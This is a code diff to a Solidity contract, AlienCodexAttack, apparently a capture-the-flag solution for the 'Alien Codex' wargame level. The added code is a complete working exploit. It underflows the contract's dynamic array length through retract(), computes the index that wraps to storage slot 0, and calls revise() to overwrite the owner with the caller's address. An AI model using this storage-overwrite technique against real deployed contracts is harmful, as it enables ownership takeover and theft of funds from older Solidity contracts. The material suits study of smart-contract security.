@@ -6,21 +6,24 @@ import "./AlienCodex.sol";
 
 contract AlienCodexAttack {
     AlienCodex public alienCodex;
+    uint public index;
+    bytes32 public myAddress;
 
     constructor(AlienCodex _alienCodex) public {
         alienCodex = _alienCodex;
     }
 
     function attack() public {
-        // Make contact with the aliens
+        index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
+        myAddress = bytes32(uint256(uint160(tx.origin)));
+
+        // Make contact with the aliens to bypass the modifier
         alienCodex.makeContact();
 
         // Call the retract function to underflow the length of the codex array
         alienCodex.retract();
 
-        // Overwrite the owner variable in the Ownable contract
-        for (uint256 i = 0; i < 3; i++) {
-            alienCodex.record(bytes32(uint256(msg.sender)));
-        }
+        // Call the revise function to write my address to the index of the underflowed array
+        alienCodex.revise(index, myAddress);
     }
 }
